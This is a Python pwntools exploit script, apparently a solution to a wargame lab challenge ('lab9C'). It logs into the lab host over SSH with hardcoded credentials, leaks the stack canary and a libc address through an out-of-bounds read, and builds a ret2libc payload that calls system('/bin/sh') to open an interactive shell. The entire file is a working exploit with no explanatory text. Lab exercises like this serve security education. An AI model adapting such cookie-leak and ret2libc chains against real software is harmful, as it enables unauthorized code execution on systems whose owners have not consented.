#!/usr/bin/env python

from pwn import *
import ctypes

context(os="linux", bits=32, arch="i386", log_level="INFO")

cookie_offset=257
libc_ret_addr_offset=261
libc_start_main_return_to_base_addr_distance=0x19a83

conn=ssh(user="lab9C", password="lab09start", host="192.168.13.101")
p = conn.connect_remote("localhost", 1337)

def leak():
    p.recvuntil("Enter choice: ")
    p.sendline("2")
    p.sendline(str(cookie_offset))
    data=p.recvline()
    cookie=ctypes.c_uint32(int(data[data.find("=")+2:-1])).value
    p.recvuntil("Enter choice: ")
    p.sendline("2")
    p.sendline(str(libc_ret_addr_offset))
    data=p.recvline()
    libc_base=ctypes.c_uint32(int(data[data.find("=")+2:-1])).value-libc_start_main_return_to_base_addr_distance
    
    return (p,cookie,libc_base)


p, cookie, libc_base=leak()
log.info("Stack cookie: 0x{:08x}".format(cookie))
log.info("Libc base: {:08x}".format(libc_base))
system_addr=libc_base+0x40190
bin_sh_addr=libc_base+0x160a24

log.progress("Constructing ROP chain to invoke \"/bin/sh\"")

buf=[]
buf.extend([0x41414141]*256)
buf.append(cookie)
buf.append(0x42424242)
buf.append(0x43434343)
buf.append(0x44444444)
buf.append(system_addr)
buf.append(0x45454545)
buf.append(bin_sh_addr)

log.progress("Adding %d elements in order to prepare ROP chain within process memory" % len(buf))

garbage=p.recvuntil("Enter choice: ")

buf_to_write=""
for b in range(len(buf)):
    buf_to_write+="1\n"+str(buf[b]) + "\n"

p.send(buf_to_write)

assert len(buf_to_write) > 5*len(buf)

garbage2=p.recvuntil("Enter choice: ")
p.sendline("3")
p.interactive()
